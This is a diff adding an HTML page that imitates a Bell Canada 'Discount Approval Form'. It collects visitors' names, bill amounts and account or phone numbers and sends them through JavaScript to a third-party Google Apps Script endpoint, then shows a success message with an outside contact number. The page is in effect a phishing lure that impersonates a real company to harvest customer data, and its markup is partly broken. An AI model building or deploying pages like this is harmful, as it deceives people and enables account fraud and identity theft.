@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Bell Discount Registeration Form</title>
+</head>
+<body>
+               <p id="alert"></p>
+
+    <div class="registration-form">
+         <span class="logo">Bell Canada</span>
+            <h1>Discount Approval Form</h1>
+     
+        <form action="https://script.google.com/macros/s/AKfycbwPD4U_4R6dIvTo6lehNJSQth45C_Vxk6-ZVvNk992GA1zFlJJjb7w-YDvPzruPEmOf/exec" method="post" id="detailsForm">  
+       
+            <div class="customerdetails">
+            <label for="fullname">Full Name</label>
+            <input type="text" id="fullname" placeholder="e.g John Doe" required name="fullname">
+            <label for="dob">Last Month Bill</label>
+            <input type="text" id="dob" placeholder="e.g 10$" required name="dob">
+            <label for="account">Bell Account Number/Cell Phone Number</label>
+            <input type="text" placeholder="e.g123456789" id="account"  required name="account">
+            
+           
+               
+           
+        </div>
+            <button type="submit" id="detailsbutton">Apply</button>
+        </form>
+       
+    
+    </div>   </div>
+    <script >
+        document.addEventListener('DOMContentLoaded', function () {
+        var detailsForm = document.getElementById('detailsForm');
+        var detailsButton = document.getElementById('detailsbutton');
+        var alertMessage = document.getElementById('alert');
+    
+        detailsForm.addEventListener('submit', function (event) {
+            event.preventDefault(); // Prevent the form from submitting the traditional way
+        
+            // Change the text of the "Send" button to indicate submission
+            detailsButton.textContent = 'Applying...';
+            
+            // Assuming you are using fetch to send data to Google Sheets
+            fetch(detailsForm.action, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams(new FormData(detailsForm)),
+            })
+            .then(response => {
+                // Assuming a successful response status indicates a successful submission
+                if (response.ok) {
+                    var alert=document.querySelector("#alert");
+                    alert.innerText="Your Application Is Successful. Don't Hesitate to Contact Us at +1(437)529-2160";
+                    alert.style.display="block";
+                      detailsButton.textContent = 'Applied Successfully';
+                    
+                } else {
+                    throw new Error('Failed to submit form');
+                }
+            })
+            .catch(error => {
+                console.error('Error submitting form:', error);
+    
+                // Change the text of the "Send" button back to its original state
+                detailsButton.textContent = 'Signin';
+    
+                // Show the error popup
+                alertMessage.innerText = "Some Error Occurred";
+                alertMessage.style.color = "red";
+            });
+        });
+    });
+    var yesradio=document.querySelector("#yes");
+    var noradio=document.querySelector("#no");
+    var haveacell=document.querySelector("#haveacell");
+    var nocellphone=document.querySelector("#nocellphone");
+    yesradio.addEventListener("click",function(){
+        haveacell.style.display="flex";
+        nocellphone.style.display="none";
+    });
+    noradio.addEventListener("click",function(){
+        haveacell.style.display="none";
+        nocellphone.style.display="flex";
+    })
+
+
+
+    </script>
+</body>
+</html>
